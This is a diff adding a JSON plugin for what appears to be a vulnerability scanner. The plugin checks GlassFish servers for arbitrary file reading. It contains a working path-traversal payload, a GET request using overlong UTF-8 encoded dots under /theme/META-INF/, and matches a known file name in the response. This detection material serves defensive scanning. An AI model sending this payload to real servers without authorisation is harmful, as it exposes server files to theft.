@@ -1,0 +1,18 @@
+{
+    "name" : "Glassfish任意文件读取",
+    "info" : "可读取服务器上的任意文件",
+    "level" : "高危",
+    "type" : "文件读取",
+    "author" : "wolf@YSRC",
+    "url": "http://bobao.360.cn/learning/detail/2564.html",
+	"keyword" : "tag:glassfish",
+	"source" : 1,
+    "plugin" : {
+        "url" : "/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/",
+        "tag" : "存在任意文件读取漏洞",
+        "analyzing" : "keyword",
+        "analyzingdata" : "package-appclient.xml",
+        "data" : "",
+        "method" : "GET"
+    }
+}
